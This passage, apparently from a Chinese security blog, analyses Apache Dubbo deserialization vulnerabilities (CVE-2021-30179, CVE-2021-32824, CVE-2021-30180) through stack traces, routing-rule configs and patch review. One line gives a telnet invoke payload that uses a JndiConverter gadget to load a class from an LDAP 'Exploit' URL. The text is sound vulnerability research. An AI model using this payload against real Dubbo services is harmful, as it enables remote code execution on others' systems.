class="keyword">this</span>.CLASS_DESERIALIZE_ALLOWED_SET.iterator();</span><br><span class="line">        String blockedPrefix;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 是否在Allow 列表内，如果在，则加入Allow缓存并且pass</span></span><br><span class="line">        <span class="comment">// 别被这里的blockedPrefix 误解了，只是共用了变量名而已，正常应该叫allowPrefix</span></span><br><span class="line">        <span class="keyword">while</span> (var2.hasNext()) &#123;</span><br><span class="line">            blockedPrefix = (String) var2.next();</span><br><span class="line">            <span class="keyword">if</span> (name.startsWith(blockedPrefix)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.CLASS_ALLOW_LFU_CACHE.put(name, <span class="keyword">this</span>.CACHE);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否在Block 列表内，如果在，则error，并且加入Block 缓存</span></span><br><span class="line">        var2 = <span class="keyword">this</span>.CLASS_DESERIALIZE_BLOCKED_SET.iterator();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.CLASS_ALLOW_LFU_CACHE.put(name, <span class="keyword">this</span>.CACHE);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                blockedPrefix = (String) var2.next();</span><br><span class="line">            &#125; <span class="keyword">while</span> (!<span class="keyword">this</span>.BLOCK_ALL_CLASS_EXCEPT_ALLOW &amp;&amp; !name.startsWith(blockedPrefix));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.CLASS_BLOCK_LFU_CACHE.put(name, <span class="keyword">this</span>.CACHE);</span><br><span class="line">            <span class="keyword">this</span>.error(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7-5-2-raw-return-类型的修复"><a href="#7-5-2-raw-return-类型的修复" class="headerlink" title="7.5.2 raw.return 类型的修复"></a>7.5.2 raw.return 类型的修复</h4><p>在PojoUtils#realize0 处理map类型时，加入了SerializeClassChecker#validClass</p><p><img src="/images/pasted-486.png" alt="upload successful"></p><p><img src="/images/pasted-487.png" alt="upload successful"></p><h4 id="7-5-3-bean-类型的修复"><a href="#7-5-3-bean-类型的修复" class="headerlink" title="7.5.3 bean 类型的修复"></a>7.5.3 bean 类型的修复</h4><p>在JavaBeanSerializeUtil#instantiateForDeserialize 实例化bean对象时，加入了SerializeClassChecker#validClass</p><p><img src="/images/pasted-488.png" alt="upload successful"></p><p><img src="/images/pasted-489.png" alt="upload successful"></p><h4 id="7-5-4-nativejava-类型的修复"><a href="#7-5-4-nativejava-类型的修复" class="headerlink" title="7.5.4 nativejava 类型的修复"></a>7.5.4 nativejava 类型的修复</h4><p>在GenericFilter 中处理nativejava 类型之前，判断dubbo.security.serialize.generic.native-java-enable 配置，默认disable，禁用了nativejava 类型</p><p><img src="/images/pasted-490.png" alt="upload successful"></p><h2 id="0x08-CVE-2021-32824"><a href="#0x08-CVE-2021-32824" class="headerlink" title="0x08 CVE-2021-32824"></a>0x08 CVE-2021-32824</h2><h3 id="8-1-影响版本"><a href="#8-1-影响版本" class="headerlink" title="8.1 影响版本"></a>8.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.9</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.9</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><h3 id="8-2-漏洞分析"><a href="#8-2-漏洞分析" class="headerlink" title="8.2 漏洞分析"></a>8.2 漏洞分析</h3><p>参考 <a href="https://cn.dubbo.apache.org/zh-cn/docs/references/telnet/">https://cn.dubbo.apache.org/zh-cn/docs/references/telnet/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost 20880</span><br><span class="line">invoke com.m0d9.sec.dubbo.basic.api.HelloService.sayHello(&#123;<span class="string">&quot;class&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;asText&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">toObjectImpl:35, JndiConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">toObject:86, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">setAsText:59, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">realize0:469, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">realize:209, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">realize:97, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">telnet:126, InvokeTelnetHandler (org.apache.dubbo.qos.legacy)</span><br><span class="line">telnet:59, TelnetHandlerAdapter (org.apache.dubbo.remoting.telnet.support)</span><br><span class="line">received:187, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)</span><br><span class="line">received:51, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-498.png" alt="upload successful"></p><blockquote><p>疑问：Telnet 依赖Dubbo 协议吗？</p></blockquote><p>跟踪<br><img src="/images/pasted-499.png" alt="upload successful"></p><h3 id="8-3-补丁分析"><a href="#8-3-补丁分析" class="headerlink" title="8.3 补丁分析"></a>8.3 补丁分析</h3><p>PojoUtils#realize0 在CVE-2021-30179的时候引入了SerializeClassChecker黑名单，引入版本为2.7.9，可以参考CVE-2021-30179一节</p><h2 id="0x09-CVE-2021-30180"><a href="#0x09-CVE-2021-30180" class="headerlink" title="0x09 CVE-2021-30180"></a>0x09 CVE-2021-30180</h2><h3 id="9-1-影响版本"><a href="#9-1-影响版本" class="headerlink" title="9.1 影响版本"></a>9.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.9</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.9</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><p>与以往的漏洞都是攻击provider 不同，这两个漏洞攻击的是consumer</p><blockquote><p>可以用来做反制蜜罐呀</p></blockquote><h3 id="9-2-漏洞分析"><a href="#9-2-漏洞分析" class="headerlink" title="9.2 漏洞分析"></a>9.2 漏洞分析</h3><h4 id="9-2-1-Router-机制"><a href="#9-2-1-Router-机制" class="headerlink" title="9.2.1 Router 机制"></a>9.2.1 Router 机制</h4><ol><li>Consumer 启动</li><li>ReferenceConfig 注册</li><li>Consumer会本地维护RegisterDirectory，需要根据新增的ReferenceConfig 进行刷新</li><li>刷新过成中，会刷新consumer 到 provider的router</li><li>各个router根据配置重新加载</li></ol><p>router有</p><ul><li>MockInvokersSelector</li><li>StandardMeshRuleRouter</li><li>TagStateRouter</li><li>ServiceStateRouter</li><li>AppStateRouter</li></ul><blockquote><p>虽然Dubbo 是register、consumer、provider 三个角色，但是kafka本身是没有RQ之类队列、路由功能，这个都得自己维护，那么为实现路由功能，就得consumer、provider自己去实现。在Dubbo中，目前看来是在consumer去实现的。</p></blockquote><h4 id="9-2-2-Tag-路由"><a href="#9-2-2-Tag-路由" class="headerlink" title="9.2.2 Tag 路由"></a>9.2.2 Tag 路由</h4><p>参考 <a href="https://cn.dubbo.apache.org/zh-cn/docs/advanced/routing-rule/#%E6%A0%87%E7%AD%BE%E8%B7%AF%E7%94%B1%E8%A7%84%E5%88%99">https://cn.dubbo.apache.org/zh-cn/docs/advanced/routing-rule/#%E6%A0%87%E7%AD%BE%E8%B7%AF%E7%94%B1%E8%A7%84%E5%88%99</a></p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>Provider</p><p>在provider上设置提供对应tag，有动静两种方式</p><ol><li>动态规则打标，yml文件，比如</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># governance-tagrouter-provider应用增加了两个标签分组tag1和tag2</span></span><br><span class="line"><span class="comment"># tag1包含一个实例 127.0.0.1:20880</span></span><br><span class="line"><span class="comment"># tag2包含一个实例 127.0.0.1:20881</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line">  <span class="attr">force:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">runtime:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">key:</span> <span class="string">governance-tagrouter-provider</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tag1</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="string">&quot;127.0.0.1:20880&quot;</span>]</span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tag2</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="string">&quot;127.0.0.1:20881&quot;</span>]</span><br><span class="line"> <span class="string">...</span></span><br></pre></td></tr></table></figure><p>动态规则方式也是漏洞产生的原因，这个配置会被写入/dubbo/config/dubbo/xxx.tag-router 中，最后由TagStateRouter 进行加载。</p><ol start="2"><li>静态打标</li></ol><p>在provider 指定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:provider tag&#x3D;&quot;tag1&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>或者service上指定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:service tag&#x3D;&quot;tag1&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>或者启动参数指定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xxx-provider.jar -Ddubbo.provider.tag&#x3D;&#123;the tag you want, may come from OS ENV&#125;</span><br></pre></td></tr></table></figure><h5 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h5><p><img src="/images/pasted-502.png" alt="upload successful"></p><p>在notify 阶段就会触发漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">parse:33, TagRuleParser (org.apache.dubbo.rpc.cluster.router.tag.model)</span><br><span class="line">process:74, TagStateRouter (org.apache.dubbo.rpc.cluster.router.tag)</span><br><span class="line">notify:276, TagStateRouter (org.apache.dubbo.rpc.cluster.router.tag)</span><br><span class="line">lambda$setInvokers$3:325, RouterChain (org.apache.dubbo.rpc.cluster)</span><br><span class="line">accept:-1, 1555965524 (org.apache.dubbo.rpc.cluster.RouterChain$$Lambda$257)</span><br><span class="line">forEach:1249, ArrayList (java.util)</span><br><span class="line">forEach:1080, Collections$UnmodifiableCollection (java.util)</span><br><span class="line">setInvokers:325, RouterChain (org.apache.dubbo.rpc.cluster)</span><br><span class="line">refreshInvoker:287, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">refreshOverrideAndInvoker:202, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">notify:180, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">notify:533, AbstractRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">doNotify:373, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">notify:365, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">doSubscribe:240, ZookeeperRegistry (org.apache.dubbo.registry.zookeeper)</span><br><span class="line">subscribe:300, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">subscribe:88, ListenerRegistryWrapper (org.apache.dubbo.registry)</span><br><span class="line">subscribe:183, DynamicDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">subscribe:117, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">doCreateInvoker:573, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">getInvoker:58, InterfaceCompatibleRegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refreshInterfaceInvoker:461, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">migrateToApplicationFirstInvoker:244, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">refreshInvoker:76, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">doMigrate:60, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">onRefer:247, MigrationRuleListener (org.apache.dubbo.registry.client.migration)</span><br><span class="line">interceptInvoker:538, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">doRefer:508, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refer:490, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refer:83, QosProtocolWrapper (org.apache.dubbo.qos.protocol)</span><br><span class="line">refer:107, ProtocolSecurityWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">refer:74, ProtocolListenerWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">refer:71, ProtocolFilterWrapper (org.apache.dubbo.rpc.cluster.filter)</span><br><span class="line">refer:52, ProtocolSerializationWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">refer:-1, Protocol$Adaptive (org.apache.dubbo.rpc)</span><br><span class="line">createInvokerForRemote:614, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">createProxy:448, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">init:300, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">get:232, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">get:131, SimpleReferenceCache (org.apache.dubbo.config.utils)</span><br><span class="line">lambda$referServices$6:396, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">accept:-1, 657998502 (org.apache.dubbo.config.deploy.DefaultModuleDeployer$$Lambda$190)</span><br><span class="line">forEach:4707, ConcurrentHashMap$ValuesView (java.util.concurrent)</span><br><span class="line">referServices:376, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">startSync:167, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">start:139, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">onContextRefreshedEvent:113, DubboDeployApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">onApplicationEvent:102, DubboDeployApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">onApplicationEvent:47, DubboDeployApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">doInvokeListener:172, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">invokeListener:165, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">multicastEvent:139, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">publishEvent:393, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">publishEvent:347, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">finishRefresh:883, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:545, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:139, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:83, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">main:34, BasicConsumer (org.apache.dubbo.samples.governance)</span><br></pre></td></tr></table></figure><h4 id="9-2-3-Condition-路由"><a href="#9-2-3-Condition-路由" class="headerlink" title="9.2.3 Condition 路由"></a>9.2.3 Condition 路由</h4><p>参考 <a href="https://cn.dubbo.apache.org/zh-cn/docs/advanced/routing-rule/#%E6%9D%A1%E4%BB%B6%E8%B7%AF%E7%94%B1">https://cn.dubbo.apache.org/zh-cn/docs/advanced/routing-rule/#%E6%9D%A1%E4%BB%B6%E8%B7%AF%E7%94%B1</a></p><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>条件路由与 Tag路由 类似，也支持动态配置，例如</p><p>应用粒度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># app1的消费者只能消费所有端口为20880的服务实例</span><br><span class="line"># app2的消费者只能消费所有端口为20881的服务实例</span><br><span class="line">---</span><br><span class="line">scope: application</span><br><span class="line">force: true</span><br><span class="line">runtime: true</span><br><span class="line">enabled: true</span><br><span class="line">key: governance-conditionrouter-consumer</span><br><span class="line">conditions:</span><br><span class="line">  - application&#x3D;app1 &#x3D;&gt; address&#x3D;*:20880</span><br><span class="line">  - application&#x3D;app2 &#x3D;&gt; address&#x3D;*:20881</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>服务粒度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># DemoService的sayHello方法只能消费所有端口为20880的服务实例</span><br><span class="line"># DemoService的sayHi方法只能消费所有端口为20881的服务实例</span><br><span class="line">---</span><br><span class="line">scope: service</span><br><span class="line">force: true</span><br><span class="line">runtime: true</span><br><span class="line">enabled: true</span><br><span class="line">key: org.apache.dubbo.samples.governance.api.DemoService</span><br><span class="line">conditions:</span><br><span class="line">  - method&#x3D;sayHello &#x3D;&gt; address&#x3D;*:20880</span><br><span class="line">  - method&#x3D;sayHi &#x3D;&gt; address&#x3D;*:20881</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h5><p>这里不同的是，在RouterChain#buildChian中就会触发，而不需要等到tagRouter 中的 #setInvokers</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">load:406, Yaml (org.yaml.snakeyaml)</span><br><span class="line">parse:44, ConditionRuleParser (org.apache.dubbo.rpc.cluster.router.condition.config.model)</span><br><span class="line">process:77, ListenableStateRouter (org.apache.dubbo.rpc.cluster.router.condition.config)</span><br><span class="line">init:144, ListenableStateRouter (org.apache.dubbo.rpc.cluster.router.condition.config)</span><br><span class="line">&lt;init&gt;:61, ListenableStateRouter (org.apache.dubbo.rpc.cluster.router.condition.config)</span><br><span class="line">&lt;init&gt;:28, AppStateRouter (org.apache.dubbo.rpc.cluster.router.condition.config)</span><br><span class="line">createRouter:48, AppStateRouterFactory (org.apache.dubbo.rpc.cluster.router.condition.config)</span><br><span class="line">getRouter:41, AppStateRouterFactory (org.apache.dubbo.rpc.cluster.router.condition.config)</span><br><span class="line">lambda$buildChain$1:98, RouterChain (org.apache.dubbo.rpc.cluster)</span><br><span class="line">apply:-1, 1003737182 (org.apache.dubbo.rpc.cluster.RouterChain$$Lambda$223)</span><br><span class="line">accept:193, ReferencePipeline$3$1 (java.util.stream)</span><br><span class="line">forEachRemaining:1374, ArrayList$ArrayListSpliterator (java.util)</span><br><span class="line">copyInto:481, AbstractPipeline (java.util.stream)</span><br><span class="line">wrapAndCopyInto:471, AbstractPipeline (java.util.stream)</span><br><span class="line">evaluateSequential:708, ReduceOps$ReduceOp (java.util.stream)</span><br><span class="line">evaluate:234, AbstractPipeline (java.util.stream)</span><br><span class="line">collect:499, ReferencePipeline (java.util.stream)</span><br><span class="line">buildChain:99, RouterChain (org.apache.dubbo.rpc.cluster)</span><br><span class="line">buildRouterChain:280, DynamicDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">doCreateInvoker:572, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">getInvoker:58, InterfaceCompatibleRegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refreshInterfaceInvoker:461, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">migrateToApplicationFirstInvoker:244, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">refreshInvoker:76, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">doMigrate:60, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">onRefer:247, MigrationRuleListener (org.apache.dubbo.registry.client.migration)</span><br><span class="line">interceptInvoker:538, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">doRefer:508, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refer:490, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refer:74, ProtocolListenerWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">refer:83, QosProtocolWrapper (org.apache.dubbo.qos.protocol)</span><br><span class="line">refer:107, ProtocolSecurityWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">refer:71, ProtocolFilterWrapper (org.apache.dubbo.rpc.cluster.filter)</span><br><span class="line">refer:52, ProtocolSerializationWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">refer:-1, Protocol$Adaptive (org.apache.dubbo.rpc)</span><br><span class="line">createInvokerForRemote:614, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">createProxy:448, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">init:300, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">get:232, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">get:131, SimpleReferenceCache (org.apache.dubbo.config.utils)</span><br><span class="line">lambda$referServices$6:396, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">accept:-1, 190153364 (org.apache.dubbo.config.deploy.DefaultModuleDeployer$$Lambda$190)</span><br><span class="line">forEach:4707, ConcurrentHashMap$ValuesView (java.util.concurrent)</span><br><span class="line">referServices:376, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">startSync:167, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">start:139, DefaultModuleDeployer (org.apache.dubbo.config.deploy)</span><br><span class="line">onContextRefreshedEvent:113, DubboDeployApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">onApplicationEvent:102, DubboDeployApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">onApplicationEvent:47, DubboDeployApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">doInvokeListener:172, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">invokeListener:165, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">multicastEvent:139, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">publishEvent:393, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">publishEvent:347, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">finishRefresh:883, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:545, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:139, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:83, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">main:34, BasicConsumer (org.apache.dubbo.samples.governance)</span><br></pre></td></tr></table></figure><h4 id="9-2-4-动态配置"><a href="#9-2-4-动态配置" class="headerlink" title="9.2.4 动态配置"></a>9.2.4 动态配置</h4><p>参考 <a href="https://cn.dubbo.apache.org/zh-cn/docsv2.7/user/configuration/config-center/">https://cn.dubbo.apache.org/zh-cn/docsv2.7/user/configuration/config-center/</a></p><p>步骤：</p><ol><li>dubbo provider 会启动一个AbstractConfiguratorListener 监听动态服务变更，并进行加载</li><li>最终还是用的snakeyaml 进行解析，触发漏洞</li></ol><h5 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">parseObject:76, ConfigParser (org.apache.dubbo.rpc.cluster.configurator.parser)</span><br><span class="line">parseConfigurators:52, ConfigParser (org.apache.dubbo.rpc.cluster.configurator.parser)</span><br><span class="line">genConfiguratorsFromRawRule:78, AbstractConfiguratorListener (org.apache.dubbo.registry.integration)</span><br><span class="line">process:66, AbstractConfiguratorListener (org.apache.dubbo.registry.integration)</span><br><span class="line">lambda$dataChanged$1:130, CacheListener (org.apache.dubbo.configcenter.support.zookeeper)</span><br><span class="line">accept:-1, 99784847 (org.apache.dubbo.configcenter.support.zookeeper.CacheListener$$Lambda$160)</span><br><span class="line">forEach:890, CopyOnWriteArrayList (java.util.concurrent)</span><br><span class="line">forEach:404, CopyOnWriteArraySet 